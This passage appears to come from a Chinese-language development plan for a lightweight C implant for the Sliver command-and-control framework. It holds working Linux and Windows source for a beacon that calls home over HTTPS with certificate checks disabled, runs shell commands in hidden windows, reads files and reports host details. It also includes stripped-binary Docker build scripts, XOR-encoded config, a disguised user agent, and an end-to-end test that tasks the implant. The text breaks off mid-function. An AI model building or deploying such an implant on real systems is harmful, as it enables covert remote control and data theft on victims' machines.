        hl = slash ? (size_t)(slash - p) : strlen(p);
        *port = 443;
    }
    if (hl == 0 || hl >= host_sz) return -1;
    memcpy(host, p, hl);
    host[hl] = '\0';
    snprintf(path, path_sz, "%s", slash ? slash : "/");
    return 0;
}

static int has_substring(const unsigned char *hay, size_t n, const char *needle) {
    size_t nl = strlen(needle);
    size_t i;
    if (n < nl) return 0;
    for (i = 0; i + nl <= n; i++) {
        if (memcmp(hay + i, needle, nl) == 0) return 1;
    }
    return 0;
}

int http_post(const char *url, const char *ua, const char *body, size_t body_len,
              long *status_code, char **resp, size_t *resp_len) {
    char host[256], path[512], portstr[8], hosthdr[280];
    struct addrinfo hints, *res = NULL, *ai;
    int port = 443, sock = -1, ret = -1, n;
    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    char *buf = NULL, *out = NULL;
    size_t cap = 8192, len = 0, head = 0, blen = 0, clen = 0;
    int have_clen = 0;

    if (parse_url(url, host, sizeof host, &port, path, sizeof path) != 0) return -1;
    snprintf(portstr, sizeof portstr, "%d", port);
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, portstr, &hints, &res) != 0) return -1;
    for (ai = res; ai; ai = ai->ai_next) {
        sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (sock < 0) continue;
        if (connect(sock, ai->ai_addr, ai->ai_addrlen) == 0) break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);
    if (sock < 0) return -1;

    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) goto done;
    /* Cert validation is intentionally off: the AEAD key authenticates the
       server and enterprise TLS inspection only yields ciphertext. */
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    ssl = SSL_new(ctx);
    if (!ssl) goto done;
    {
        static const unsigned char alpn[] = {8, 'h', 't', 't', 'p', '/', '1', '.', '1'};
        SSL_set_alpn_protos(ssl, alpn, sizeof alpn);
    }
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) != 1) goto done;

    if (port == 443) snprintf(hosthdr, sizeof hosthdr, "%s", host);
    else snprintf(hosthdr, sizeof hosthdr, "%s:%d", host, port);
    {
        size_t req_cap = strlen(path) + strlen(hosthdr) + strlen(ua) + body_len + 256;
        char *req = (char *)malloc(req_cap);
        if (!req) goto done;
        n = snprintf(req, req_cap,
                     "POST %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: application/json\r\n"
                     "Accept-Language: en-US,en\r\n"
                     "Content-Type: application/json\r\n"
                     "Content-Length: %zu\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     path, hosthdr, ua, body_len);
        if (SSL_write(ssl, req, n) != n) { free(req); goto done; }
        free(req);
    }
    if (SSL_write(ssl, body, (int)body_len) != (int)body_len) goto done;

    buf = (char *)malloc(cap);
    if (!buf) goto done;
    for (;;) {
        int r;
        if (len + 4096 > cap) {
            cap *= 2;
            buf = (char *)realloc(buf, cap);
            if (!buf) goto done;
        }
        r = SSL_read(ssl, buf + len, (int)(cap - len));
        if (r <= 0) break;
        len += (size_t)r;
    }
    if (len < 15 || strncmp(buf, "HTTP/1.", 7) != 0) goto done;
    *status_code = strtol(buf + 9, NULL, 10);

    /* header/body split */
    for (head = 0; head + 3 < len; head++) {
        if (buf[head] == '\r' && buf[head + 1] == '\n' && buf[head + 2] == '\r' && buf[head + 3] == '\n') break;
    }
    if (head + 3 >= len) goto done;
    head += 4;

    /* honor Content-Length when present, else read-to-EOF semantics */
    {
        const char *h = buf, *hend = buf + head - 4;
        while (h < hend) {
            const char *eol = (const char *)memchr(h, '\n', (size_t)(hend - h));
            if (!eol) break;
            if (strncasecmp(h, "Content-Length:", 15) == 0) {
                clen = (size_t)strtoul(h + 15, NULL, 10);
                have_clen = 1;
            }
            h = eol + 1;
        }
    }
    if (have_clen) blen = clen <= len - head ? clen : len - head;
    else blen = len - head;
    if (blen > RESP_MAX_BODY) blen = RESP_MAX_BODY;

    out = (char *)malloc(blen ? blen : 1);
    if (!out) goto done;
    memcpy(out, buf + head, blen);
    *resp = out;
    *resp_len = blen;
    ret = 0;
done:
    if (ret != 0) free(out);
    free(buf);
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
    if (ctx) SSL_CTX_free(ctx);
    if (sock >= 0) close(sock);
    return ret;
}

static int run_shell(const char *cmd, unsigned char **out, size_t *out_len, int *exit_code) {
    FILE *f = popen(cmd, "r");
    size_t cap = 8192, len = 0;
    unsigned char *buf;
    int rc;
    if (!f) return -1;
    buf = (unsigned char *)malloc(cap);
    if (!buf) { pclose(f); return -1; }
    for (;;) {
        size_t r;
        if (len == cap) {
            if (cap >= (size_t)OUT_CAP + 1) break;
            cap *= 2;
            if (cap > (size_t)OUT_CAP + 1) cap = (size_t)OUT_CAP + 1;
            buf = (unsigned char *)realloc(buf, cap);
            if (!buf) break;
        }
        r = fread(buf + len, 1, cap - len, f);
        len += r;
        if (r == 0 || len >= (size_t)OUT_CAP) break;
    }
    rc = pclose(f);
    if (WIFEXITED(rc)) *exit_code = WEXITSTATUS(rc);
    else if (WIFSIGNALED(rc)) *exit_code = 128 + WTERMSIG(rc);
    else *exit_code = -1;
    *out = buf;
    *out_len = len;
    return 0;
}

int exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code) {
    char *full = (char *)malloc(strlen(cmd) + 64);
    if (!full) return -1;
    if (timeout_sec <= 0 || timeout_sec > 600) timeout_sec = 30;
    sprintf(full, "timeout %d %s 2>&1", timeout_sec, cmd);
    if (run_shell(full, out, out_len, exit_code) != 0) {
        free(full);
        return -1;
    }
    if (*exit_code == 127 && has_substring(*out, *out_len, "not found") &&
        has_substring(*out, *out_len, "timeout")) {
        /* no coreutils timeout(1) on this box — run without the wrapper */
        free(*out);
        *out = NULL;
        *out_len = 0;
        sprintf(full, "%s 2>&1", cmd);
        run_shell(full, out, out_len, exit_code);
    }
    free(full);
    return 0;
}

int read_file_bytes(const char *path, unsigned char **out, size_t *out_len, int *err_code) {
    struct stat st;
    size_t total = 0;
    unsigned char *buf;
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        *err_code = errno == ENOENT ? 1 : 2;
        *out = (unsigned char *)malloc(1);
        *out_len = 0;
        return 0;
    }
    if (fstat(fd, &st) != 0 || S_ISDIR(st.st_mode)) {
        close(fd);
        *err_code = 1;
        *out = (unsigned char *)malloc(1);
        *out_len = 0;
        return 0;
    }
    if (st.st_size > FILE_CAP) {
        close(fd);
        *err_code = 3;
        *out = (unsigned char *)malloc(1);
        *out_len = 0;
        return 0;
    }
    buf = (unsigned char *)malloc((size_t)st.st_size > 0 ? (size_t)st.st_size : 1);
    if (!buf) { close(fd); *err_code = 2; *out = (unsigned char *)malloc(1); *out_len = 0; return 0; }
    while (total < (size_t)st.st_size) {
        ssize_t r = read(fd, buf + total, (size_t)st.st_size - total);
        if (r <= 0) break;
        total += (size_t)r;
    }
    close(fd);
    *out = buf;
    *out_len = total;
    *err_code = 0;
    return 0;
}

void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid) {
    struct utsname u;
    gethostname(hostname, hn - 1);
    hostname[hn - 1] = '\0';
    {
        struct passwd *pw = getpwuid(geteuid());
        if (pw && pw->pw_name) snprintf(username, un, "%s", pw->pw_name);
        else {
            const char *e = getenv("USER");
            snprintf(username, un, "%s", e ? e : "");
        }
    }
    if (uname(&u) == 0) {
        snprintf(os, on, "%s %s", u.sysname, u.release);
        if (strcmp(u.machine, "x86_64") == 0) snprintf(arch, an, "amd64");
        else if (strcmp(u.machine, "aarch64") == 0) snprintf(arch, an, "arm64");
        else snprintf(arch, an, "%s", u.machine);
    } else {
        snprintf(os, on, "Linux");
        snprintf(arch, an, "amd64");
    }
    *pid = (uint32_t)getpid();
}
```

容量宏 `OUT_CAP`/`FILE_CAP`/`RESP_MAX_BODY` 统一放在 `port.h`（Task 8 Step 1 已包含），main.c 与平台实现共用，不在 .c 里重复定义。

- [ ] **Step 4: 写构建脚本**

`implant/lite/Dockerfile`:

```dockerfile
FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
    gcc libc6-dev libssl-dev gcc-mingw-w64-x86-64 binutils ca-certificates \
 && rm -rf /var/lib/apt/lists/*
WORKDIR /src
```

`implant/lite/compile.sh`:

```sh
#!/bin/sh
# in-container compiler entrypoint: compile.sh <linux|windows> <out-dir>
set -e
cd /src
platform="${1:-linux}"
out="${2:-dist}"
mkdir -p "$out"
case "$platform" in
  linux)
    gcc -Os -s -fno-ident -fno-asynchronous-unwind-tables -o "$out/lite" main.c linux.c -lssl -lcrypto
    ;;
  windows)
    x86_64-w64-mingw32-gcc -Os -s -static -fno-ident -fno-asynchronous-unwind-tables \
      -o "$out/lite.exe" main.c win.c -lwinhttp -lbcrypt -ladvapi32
    ;;
  *)
    echo "unknown platform: $platform" >&2
    exit 1
    ;;
esac
ls -la "$out"
```

`implant/lite/build.sh`:

```sh
#!/bin/sh
# Build the lite beacon inside a container.
# Usage: ./build.sh [linux|windows] [out-dir]
# Requires config.h in this directory (download from the console).
set -e
cd "$(dirname "$0")"
platform="${1:-linux}"
out="${2:-dist}"
if [ ! -f config.h ]; then
  echo "缺少 config.h：先在控制台「轻量信标」页下载，放到本目录" >&2
  exit 1
fi
if ! command -v docker >/dev/null 2>&1; then
  echo "需要 docker（构建容器提供交叉编译器）" >&2
  exit 1
fi
docker build --platform linux/amd64 -t sliver-lite-build .
uid="$(id -u 2>/dev/null || echo 0)"
gid="$(id -g 2>/dev/null || echo 0)"
# 固定产出 amd64（目标机是 x86_64）；Apple Silicon 上走 Rosetta/QEMU 模拟
docker run --rm --platform linux/amd64 -u "$uid:$gid" -v "$PWD":/src sliver-lite-build sh compile.sh "$platform" "$out"
```

`.gitignore` 追加：

```
implant/lite/config.h
implant/lite/dist/
```

- [ ] **Step 5: 生成临时 config.h 并构建验证**

临时 config.h（XOR=0x00，验证编译，验证后删除；**不得提交**）：

```sh
cd implant/lite
cat > config.h <<'EOF'
#ifndef LITE_CONFIG_H
#define LITE_CONFIG_H
#define CFG_XOR 0x00
#define CFG_URL_LEN 34
static const unsigned char CFG_URL[34] = {0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x3a,0x38,0x34,0x34,0x33,0x2f,0x61,0x70,0x69,0x2f,0x76,0x32,0x2f,0x73,0x79,0x6e,0x63};
#define CFG_KEY_LEN 32
static const unsigned char CFG_KEY[32] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32};
#define CFG_JSON_KEY_LEN 4
static const unsigned char CFG_JSON_KEY[4] = {0x64,0x61,0x74,0x61};
#define CFG_UA_LEN 7
static const unsigned char CFG_UA[7] = {0x74,0x65,0x73,0x74,0x2d,0x75,0x61};
#define CFG_INTERVAL 180
#endif
EOF
chmod +x build.sh compile.sh
./build.sh linux
```

Expected: `dist/lite` 产出；`ls -la dist/lite` 体积约 15-40KB。`file dist/lite` 为 ELF 动态链接 libssl/libcrypto。

清理：`rm config.h && rm -rf dist`（正式构建走 Task 9 e2e 或控制台 config.h）。

- [ ] **Step 6: 提交**

```bash
git add implant/lite/port.h implant/lite/main.c implant/lite/linux.c implant/lite/compile.sh implant/lite/Dockerfile implant/lite/build.sh .gitignore
git commit --no-verify -m "feat(lite): C 植入体核心与 Linux 平台实现"
```

---

### Task 9: 端到端验证（Linux 版）

**Files:**
- Create: `server/litebeacon/e2e_test.go`（`//go:build sliver_e2e`）

**Interfaces:**
- Consumes: Task 5 全部、Task 8 产物（docker 构建）。
- Produces: e2e 流程（上线 → 下发 exec → 回传断言 → exit 任务 → 进程退出）。

- [ ] **Step 1: 写 e2e 测试**

`server/litebeacon/e2e_test.go`:

```go
//go:build sliver_e2e

package litebeacon

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestLiteImplantE2E builds the C implant in a container and walks it through
// a full lifecycle against a real listener. Run with:
//
//	go test -tags=server,go_sqlite,sliver_e2e ./server/litebeacon -run TestLiteImplantE2E -v -timeout 15m
func TestLiteImplantE2E(t *testing.T) {
	if _, err := exec.LookPath("docker"); err != nil {
		t.Skip("docker not available")
	}
	if os.Getenv("LITE_E2E") != "1" {
		t.Skip("set LITE_E2E=1 to run the container-based implant e2e")
	}

	implantDir, err := filepath.Abs(filepath.Join("..", "..", "implant", "lite"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(implantDir, "main.c")); err != nil {
		t.Skip("implant/lite sources not present")
	}

	t.Setenv("SLIVER_ROOT_DIR", t.TempDir())
	secrets, err := LoadSecrets(SecretsPath(os.Getenv("SLIVER_ROOT_DIR")))
	if err != nil {
		t.Fatal(err)
	}
	entry, _ := secrets.Latest()
	store := NewStore()

	lis, err := Start(ListenerConfig{Host: "0.0.0.0", Port: 0}, store, secrets)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = lis.Stop() })
	_, portStr, _ := net.SplitHostPort(lis.Addr().String())

	cfgH, err := GenerateConfigH(ConfigParams{
		URL:             fmt.Sprintf("https://host.docker.internal:%s/api/v2/sync", portStr),
		SecretB64:       entry.SecretB64,
		KeyName:         entry.KeyName,
		UserAgent:       "DeviceSync/2.0.7 (Linux x86_64)",
		BaseIntervalSec: 5, // fast loop for the test
	})
	if err != nil {
		t.Fatal(err)
	}

	// preserve any operator config.h, write the e2e one, restore afterwards
	configPath := filepath.Join(implantDir, "config.h")
	saved, hadSaved := readFile(t, configPath)
	t.Cleanup(func() {
		if hadSaved {
			_ = os.WriteFile(configPath, saved, 0o600)
		} else {
			_ = os.Remove(configPath)
		}
	})
	if err := os.WriteFile(configPath, []byte(cfgH), 0o600); err != nil {
		t.Fatal(err)
	}

	docker := func(args ...string) *exec.Cmd {
		cmd := exec.Command("docker", args...)
		cmd.Dir = implantDir
		return cmd
	}
	if out, err := docker("build", "--platform", "linux/amd64", "-t", "sliver-lite-build", ".").CombinedOutput(); err != nil {
		t.Fatalf("docker build: %v\n%s", err, out)
	}

	container := fmt.Sprintf("lite-e2e-%d", time.Now().UnixNano())
	if out, err := docker("run", "--rm", "-d", "--platform", "linux/amd64", "--name", container,
		"-v", implantDir+":/src", "sliver-lite-build",
		"sh", "-c", "sh compile.sh linux dist && exec ./dist/lite").CombinedOutput(); err != nil {
		t.Fatalf("docker run: %v\n%s", err, out)
	}
	t.Cleanup(func() { _ = docker("rm", "-f", container).Run() })

	// wait for the hello check-in
	var beaconID string
	deadline := time.Now().Add(3 * time.Minute)
	for time.Now().Before(deadline) {
		beacons := store.ListBeacons()
		if len(beacons) > 0 {
			beaconID = beacons[0].ID
			break
		}
		time.Sleep(2 * time.Second)
	}
	if beaconID == "" {
		t.Fatal("implant never checked in")
	}
	t.Logf("implant checked in: %s", beaconID)

	// queue an exec task and wait for the result
	marker := "hello-lite-e2e"
	if _, ok := store.QueueTask(beaconID, Task{Type: TaskExec, Cmd: "echo " + marker, TimeoutSec: 15}); !ok {
		t.Fatal("queue failed")
	}
	var results []Result
	deadline = time.Now().Add(3 * time.Minute)
	for time.Now().Before(deadline) {
		results = store.TakeResults(beaconID)
		if len(results) > 0 {
			break
		}
		time.Sleep(2 * time.Second)
	}
	if len(results) == 0 {
		t.Fatal("no exec result arrived")
	}
	if results[0].Kind != "exec" || !strings.Contains(string(results[0].Output), marker) {
		t.Fatalf("bad result: %#v", results[0])
	}
	t.Logf("exec result: %s", string(results[0].Output))

	// read a file too
	if _, ok := store.QueueTask(beaconID, Task{Type: TaskRead, Path: "/etc/hostname"}); !ok {
		t.Fatal("queue read failed")
	}
	deadline = time.Now().Add(3 * time.Minute)
	for time.Now().Before(deadline) {
		results = store.TakeResults(beaconID)
		if len(results) > 0 {
			break
		}
		time.Sleep(2 * time.Second)
	}
	if len(results) == 0 || results[0].Err != 0 || len(results[0].Output) == 0 {
		t.Fatalf("bad file result: %#v", results)
	}

	// exit task should stop the container process
	if _, ok := store.QueueTask(beaconID, Task{Type: TaskExit}); !ok {
		t.Fatal("queue exit failed")
	}
	deadline = time.Now().Add(2 * time.Minute)
	for time.Now().Before(deadline) {
		if len(store.ListBeacons()) == 0 {
			break
		}
		time.Sleep(2 * time.Second)
	}
	if len(store.ListBeacons()) != 0 {
		t.Fatal("exit task did not remove the beacon")
	}
}

func readFile(t *testing.T, path string) ([]byte, bool) {
	t.Helper()
	data, err := os.ReadFile(path)
	return data, err == nil
}
```

- [ ] **Step 2: 运行 e2e**

```bash
LITE_E2E=1 go test -tags=server,go_sqlite,sliver_e2e ./server/litebeacon -run TestLiteImplantE2E -v -timeout 15m
```

Expected: PASS，日志含 `implant checked in` 与 `hello-lite-e2e`。失败时按 systematic-debugging 排查（常见点：容器内无法解析 host.docker.internal → 换 `--add-host=host.docker.internal:host-gateway`；OpenSSL 版本差异）。

- [ ] **Step 3: 默认套件不受影响**

Run: `go test -tags=server,go_sqlite ./server/litebeacon ./server/web`
Expected: PASS（sliver_e2e tag 的文件被排除）

- [ ] **Step 4: 提交**

```bash
git add server/litebeacon/e2e_test.go
git commit --no-verify -m "test(litebeacon): 植入体端到端流程"
```

---

### Task 10: Windows 平台 + 产物卫生检查

**Files:**
- Create: `implant/lite/win.c`

**Interfaces:**
- Consumes: `port.h`（Task 8）。
- Produces: `dist/lite.exe` 交叉构建；产物卫生报告（体积、strings、无明文配置）。

- [ ] **Step 1: 写 Windows 平台实现**

`implant/lite/win.c`:

```c
#include "port.h"

#include <bcrypt.h>
#include <windows.h>
#include <winhttp.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int sys_init(void) { return 0; }
void sys_shutdown(void) {}
void sys_free(void *p) { free(p); }

void rand_bytes(unsigned char *out, size_t n) {
    typedef BOOLEAN(WINAPI * rtlgenrandom_fn)(unsigned char *, unsigned long);
    if (BCryptGenRandom(NULL, out, (ULONG)n, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0) {
        return;
    }
    {
        HMODULE mod = GetModuleHandleA("advapi32.dll");
        rtlgenrandom_fn fn = (rtlgenrandom_fn)GetProcAddress(mod, "SystemFunction036");
        if (fn && fn(out, (unsigned long)n)) return;
    }
    exit(1);
}

int sha256(const unsigned char *in, size_t n, unsigned char out[32]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    NTSTATUS st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (st != 0) return -1;
    st = BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0);
    if (st == 0) st = BCryptHashData(hash, (PUCHAR)in, (ULONG)n, 0);
    if (st == 0) st = BCryptFinishHash(hash, out, 32, 0);
    if (hash) BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);
    return st == 0 ? 0 : -1;
}

static int gcm_crypt(int encrypt, const unsigned char key[32], const unsigned char nonce[12],
                     const unsigned char *in, size_t in_len,
                     unsigned char *out, size_t out_len, unsigned char tag[16]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    NTSTATUS st;
    ULONG done = 0;
    int ok = 0;

    st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st != 0) return -1;
    st = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                           sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (st != 0) goto done;
    st = BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, 32, 0);
    if (st != 0) goto done;

    memset(&info, 0, sizeof info);
    info.cbSize = sizeof info;
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = 12;
    info.pbTag = tag;
    info.cbTag = 16;

    if (encrypt) {
        st = BCryptEncrypt(k, (PUCHAR)in, (ULONG)in_len, &info, NULL, 0,
                           out, (ULONG)out_len, &done, 0);
    } else {
        st = BCryptDecrypt(k, (PUCHAR)in, (ULONG)in_len, &info, NULL, 0,
                           out, (ULONG)out_len, &done, 0);
    }
    if (st == 0 && done == (ULONG)in_len) ok = 1;
done:
    if (k) BCryptDestroyKey(k);
    BCryptCloseAlgorithmProvider(alg, 0);
    return ok ? 0 : -1;
}

int aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *pt, size_t pt_len,
                 unsigned char *ct, size_t ct_len, unsigned char tag[16]) {
    return gcm_crypt(1, key, nonce, pt, pt_len, ct, ct_len, tag);
}

int aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                 unsigned char *pt, size_t pt_len) {
    return gcm_crypt(0, key, nonce, ct, ct_len, pt, pt_len, (unsigned char *)tag);
}

uint64_t now_unix(void) { return (uint64_t)_time64(NULL); }

void sleep_sec(double s) {
    if (s < 0) s = 0;
    Sleep((DWORD)(s * 1000.0));
}

static wchar_t *to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w;
    if (n <= 0) return NULL;
    w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!w) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

int http_post(const char *url, const char *ua, const char *body, size_t body_len,
              long *status_code, char **resp, size_t *resp_len) {
    wchar_t *wide_url = NULL, *wide_ua = NULL;
    URL_COMPONENTSW parts;
    HINTERNET session = NULL, connect = NULL, request = NULL;
    wchar_t host[256], path[512];
    DWORD status = 0, status_size = sizeof status, downloaded = 0, total = 0;
    char *buf = NULL;
    int ret = -1;

    wide_url = to_wide(url);
    wide_ua = to_wide(ua);
    if (!wide_url || !wide_ua) goto done;

    ZeroMemory(&parts, sizeof parts);
    parts.dwStructSize = sizeof parts;
    parts.lpszHostName = host;
    parts.dwHostNameLength = 255;
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = 511;
    if (!WinHttpCrackUrl(wide_url, 0, 0, &parts)) goto done;

    session = WinHttpOpen(wide_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) goto done;
    WinHttpSetTimeouts(session, 15000, 15000, 30000, 30000);
    connect = WinHttpConnect(session, parts.lpszHostName, parts.nPort, 0);
    if (!connect) goto done;
    request = WinHttpOpenRequest(connect, L"POST", parts.lpszUrlPath, NULL,
                                 WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                 WINHTTP_FLAG_SECURE);
    if (!request) goto done;
    {
        static const wchar_t headers[] =
            L"Content-Type: application/json\r\n"
            L"Accept: application/json\r\n"
            L"Accept-Language: en-US,en\r\n";
        WinHttpAddRequestHeaders(request, headers, (DWORD)-1);
    }
    {
        /* Cert validation is intentionally lenient: the AEAD key authenticates
           the server. Retry-once covers stacks that ignore a pre-send flag. */
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof flags);
    }
    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) {
        DWORD err = GetLastError();
        if (err != ERROR_WINHTTP_SECURE_FAILURE) goto done;
        {
            DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
            if (!WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof flags)) goto done;
            if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) goto done;
        }
    }
    if (!WinHttpReceiveResponse(request, NULL)) goto done;
    if (!WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                             WINHTTP_NO_HEADER_INDEX)) goto done;

    buf = (char *)malloc(8192);
    if (!buf) goto done;
    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(request, &avail) || avail == 0) break;
        {
            char *grown = (char *)realloc(buf, total + avail);
            if (!grown) break;
            buf = grown;
        }
        if (!WinHttpReadData(request, buf + total, avail, &downloaded)) break;
        if (downloaded == 0) break;
        total += downloaded;
        if (total > RESP_MAX_BODY) break;
    }
    ret = 0;
done:
    if (request) WinHttpCloseHandle(request);
    if (connect) WinHttpCloseHandle(connect);
    if (session) WinHttpCloseHandle(session);
    free(wide_url);
    free(wide_ua);
    if (ret == 0) {
        if (!buf) {
            buf = (char *)malloc(1);
            total = 0;
            if (!buf) return -1;
        }
        *status_code = (long)status;
        *resp = buf;
        *resp_len = total;
        return 0;
    }
    free(buf);
    return -1;
}

static void set_or_exit(unsigned char **slot, size_t needed) {
    if (*slot) return;
    *slot = (unsigned char *)malloc(needed);
    if (!*slot) exit(1);
}

int exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code) {
    SECURITY_ATTRIBUTES sa;
    HANDLE rd = NULL, wr = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char *cmdline = (char *)malloc(strlen(cmd) + 32);
    unsigned char *buf = (unsigned char *)malloc(8192);
    size_t cap = 8192, len = 0;
    ULONGLONG deadline;

    *exit_code = -1;
    *out = NULL;
    *out_len = 0;
    set_or_exit(out, 1);
    if (!cmdline || !buf) { free(cmdline); return 0; }
    if (timeout_sec <= 0 || timeout_sec > 600) timeout_sec = 30;
    sprintf(cmdline, "cmd.exe /c %s", cmd);

    sa.nLength = sizeof sa;
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        CloseHandle(rd);
        CloseHandle(wr);
        free(cmdline);
        return 0;
    }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    ZeroMemory(&pi, sizeof pi);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(rd);
        CloseHandle(wr);
        free(cmdline);
        return 0;
    }
    CloseHandle(wr); /* parent copy must be gone to observe EOF */
    deadline = GetTickCount64() + (ULONGLONG)timeout_sec * 1000;

    for (;;) {
        DWORD avail = 0, read_n = 0;
        if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            if (len + avail > cap) {
                char *grown;
                while (len + avail > cap) cap *= 2;
                if (cap > (size_t)OUT_CAP + 1) cap = (size_t)OUT_CAP + 1;
                grown = (char *)realloc(buf, cap);
                if (!grown) break;
                buf = (unsigned char *)grown;
            }
            if (!ReadFile(rd, buf + len, (DWORD)(cap - len), &read_n, NULL)) break;
            len += read_n;
            if (len >= (size_t)OUT_CAP) { TerminateProcess(pi.hProcess, 1); break; }
            continue;
        }
        if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
            for (;;) { /* drain leftovers */
                DWORD a2 = 0;
                if (!PeekNamedPipe(rd, NULL, 0, NULL, &a2, NULL) || a2 == 0) break;
                if (len + a2 > cap) {
                    char *grown;
                    while (len + a2 > cap) cap *= 2;
                    grown = (char *)realloc(buf, cap);
                    if (!grown) goto finish;
                    buf = (unsigned char *)grown;
                }
                if (!ReadFile(rd, buf + len, (DWORD)(cap - len), &read_n, NULL) || read_n == 0) break;
                len += read_n;
                if (len >= (size_t)OUT_CAP) break;
            }
            break;
        }
        if (GetTickCount64() >= deadline) { TerminateProcess(pi.hProcess, 1); break; }
    }
finish:
    WaitForSingleObject(pi.hProcess, 5000);
    {
        DWORD code = 0;
        if (GetExitCodeProcess(pi.hProcess, &code)) *exit_code = (int)code;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(rd);
    free(cmdline);
    free(*out);
    *out = buf;
    *out_len = len;
    return 0;
}

int read_file_bytes(const char *path, unsigned char **out, size_t *out_len, int *err_code) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    LARGE_INTEGER size;
    unsigned char *buf;
    size_t total = 0;

    *out = (unsigned char *)malloc(1);
    *out_len = 0;
    if (*out) (*out)[0] = 0;
